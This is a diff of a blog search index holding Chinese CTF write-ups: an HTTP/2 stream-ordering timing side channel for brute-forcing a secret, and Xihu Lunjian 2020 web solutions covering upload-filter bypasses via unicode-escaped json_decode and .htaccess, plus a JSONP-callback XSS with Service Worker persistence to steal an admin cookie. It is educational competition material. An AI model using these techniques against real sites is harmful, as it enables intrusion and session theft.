+<h3 id="HTTP-2-0新特性"><a href="#HTTP-2-0新特性" class="headerlink" title="HTTP/2.0新特性"></a>HTTP/2.0新特性</h3><blockquote>
+<p>HTTP/2通过支持标头字段压缩和在同一连接上进行多个并发交换，让应用更有效地利用网络资源。还允许为请求设置优先级，让更重要的请求更快速地完成，从而进一步提升性能。<br>HTTP/2所有性能增强的核心在于新的二进制分帧层，它定义了如何封装HTTP消息并在客户端与服务器之间传输。可归纳如下:</p>
+</blockquote>
+<ul>
+<li>所有通信都在一个TCP连接上完成，此链接可以承载任意数量的双向数据流。</li>
+<li>每个数据流都有一个唯一的标识符和可选的优先级信息，用于承载双向消息。</li>
+<li>每条消息都是一条逻辑HTTP消息(如请求/响应)，包含一个或多个帧。</li>
+<li>帧是最小的通信单位，承载着特定类型的数据，例如HTTP标头、消息负载等等。来自不同数据流的帧可以交错发送，然后根据每个帧头的数据流标识符重新组装。</li>
+</ul>
+<h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>从HTTP/2.0协议的新特性中得知，每个数据流都会有一个唯一的标识符，称为streamId。由于多路复用的特性，不同的请求在同一连接中以几乎并行的方式发送，服务端会根据streamId重新组装然后执行请求逻辑，一有返回立即发送响应内容。因此可以通过如下的方式侧信道得出每一位secret值。<br>首先爆破出secret的位数，假设为10。<br>那么接下来，对于其中的每一位，在尝试所有字符的爆破时，准备2种类型的请求。</p>
+<ol>
+<li><font color=#008000>A</font>:secret参数中对应的位为”*”(一个绝对不会存在secret中的字符)，使得在比较该位时，一定会失败然后直接返回。</li>
+<li><font color=#008000>B</font>:secret参数中对应的位为尝试爆破的字符，使得在比较该位时，有可能会比较成功，然后sleep一个很小的时间，后返回。</li>
+</ol>
+<p>然后通过返回顺序来猜测该位的值，为了避免误差，这两种请求的发送顺序会分别进行交换。且对于每一组实验，分别进行10次。即整个过程是这样的。</p>
+<ul>
+<li>第一次: 先发送A,紧接着发送B。在10次实验的结果中，若A返回更快的次数更多，则认定A先返回，否则认为B返回更快。  </li>
+<li>第二次: 先发送B，紧接着发送A。在10次实验结果中，若A返回更快的次数更多，则认定A先返回，否则认为B返回更快。</li>
+</ul>
+<p>结果判断依据。<br>第一次A返回更快且第二次B返回更快  =&gt; 不是正确的字符<br>第一次A返回更快且第二次A返回更快 =&gt; 是正确字符<br>第一次B返回更快且第二次A返回更快 =&gt; 不是正确的字符<br>第一次B返回更快且第二次B返回更快 =&gt; 不是正确字符</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://github.com/paul-axe/ctf/tree/master/wctf2020/sshlyuxa" target="_blank" rel="noopener">https://github.com/paul-axe/ctf/tree/master/wctf2020/sshlyuxa</a></li>
+<li><a href="https://github.com/ConnorNelson/spaceless-spacing" target="_blank" rel="noopener">https://github.com/ConnorNelson/spaceless-spacing</a></li>
+<li><a href="https://developers.google.com/web/fundamentals/performance/http2?hl=zh-cns" target="_blank" rel="noopener">https://developers.google.com/web/fundamentals/performance/http2?hl=zh-cn</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>西湖论剑2020 Web writeup</title>
+    <url>/2020/10/15/xihulunjian2020/</url>
+    <content><![CDATA[<p>在官方放出了复现地址以及wp后，找到了时间对当时没做出来的题进行复现，也是对此次比赛的一个总结。<br>复现环境:<br><a href="http://hellodiscuzq.xhlj.wetolink.com/" target="_blank" rel="noopener">hellodiscuzq</a><br><a href="https://xss.hardxss.xhlj.wetolink.com/" target="_blank" rel="noopener">hardxss</a><br><a href="http://newupload.xhlj.wetolink.com/" target="_blank" rel="noopener">NewUpload</a><br><a href="http://flagshop.xhlj.wetolink.com/" target="_blank" rel="noopener">FlagShop</a><br><a href="http://easyjson.xhlj.wetolink.com/" target="_blank" rel="noopener">EasyJson</a></p>
+<a id="more"></a>
+<h1 id="EasyJson"><a href="#EasyJson" class="headerlink" title="EasyJson"></a>EasyJson</h1><p>这道题比较简单，考察的是<font color=#008000>json_decode函数在处理unicode编码的字符时会将其变成原字符</font>。<br>首先审计源码。<br><img src="1.png" alt=""><br>当action为write时，且文件名和文件内容通过SecurityCheck后，就会将内容进行json_decode()，然后上传文件。<br>经过Fuzzing，文件名不能以数字开头，如1.php。<br><img src="2.png" alt=""><br>且文件内容中不能出现php和on，这里使用unicode编码即可绕过。<br><img src="3.png" alt=""><br>然后列出/目录，可以发现readflag。<br><img src="4.png" alt=""><br>最后执行readflag，即可获得flag。<br><img src="5.png" alt=""></p>
+<h1 id="NewUpload"><a href="#NewUpload" class="headerlink" title="NewUpload"></a>NewUpload</h1><p>这道题的解法很多种，官方就列出了2种方法。来一个个看看。<br>在测试时，若未绕过WAF，发送出去的请求长时间未响应。经过测试后，发现文件后缀不能以php结尾且文件内容甚至不能包含<code>&lt;</code>。</p>
+<h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><p>方法一采用<font color=#008000>.htaccess文件</font>和<font color=#008000>lua文件</font>。</p>
+<h1 id="HardXSS"><a href="#HardXSS" class="headerlink" title="HardXSS"></a>HardXSS</h1><p>这道题是一道JSONP结合Service Worker的题。打开页面后，在登录的页面源码中发现了JSONP请求。<br><img src="6.png" alt=""><br>在这段代码的前面还可以看到有一个auto_reg_var()函数，可以达到变量覆盖的效果，控制前callback的值。在发送jsonp请求时，首先创建一个script元素，然后将<code>&quot;https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=&quot; + callback</code>的值赋值为script.src。<br>当callback为js代码时，可以被执行。尝试callback为<code>alert(1)</code>。结果如下:<br><img src="7.png" alt="">  </p>
+<p>可将payload放入callback参数后，然后将此此uri提交给admin，使其点击。在联系站长页面，可提交uri。经测试callback参数值的长度限制在50。可利用此处的jsonp来获取外部的js代码。<br>在联系站长页面有一段文字提示。提示表明会先点开链接再登录网站，js代码先执行，然后后端再登录网站。<br><img src="8.png" alt=""><br>若脚本未驻留在网站上，无法获取登录后的cookie。使用<font color=#008000>ServiceWorker</font>可造成驻留。</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
       </tags>
   </entry>
 </search>
